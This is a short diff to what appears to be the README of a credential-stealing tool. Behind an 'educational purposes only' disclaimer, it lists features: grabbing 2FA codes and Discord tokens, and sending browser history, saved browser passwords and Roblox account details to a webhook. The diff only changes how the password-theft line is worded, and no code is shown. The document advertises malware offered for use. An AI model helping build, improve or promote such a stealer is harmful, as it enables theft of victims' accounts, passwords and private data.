@@ -13,5 +13,5 @@ THIS WAS MADE FOR EDUCATIONAL PURPOSES ONLY. I AM NOT RESPONSIBLE OF ANY MALICIO
 - Grabs 2AF Codes
 - Grabs Discord Token
 - Sends Browser History
-- Sends Chrome Passwords (Edge/Firefox/Opera/etc.)
+- Sends Browser Passwords (Chrome/Edge/Firefox/Opera/etc.)
 - Sends Roblox Info to webhook
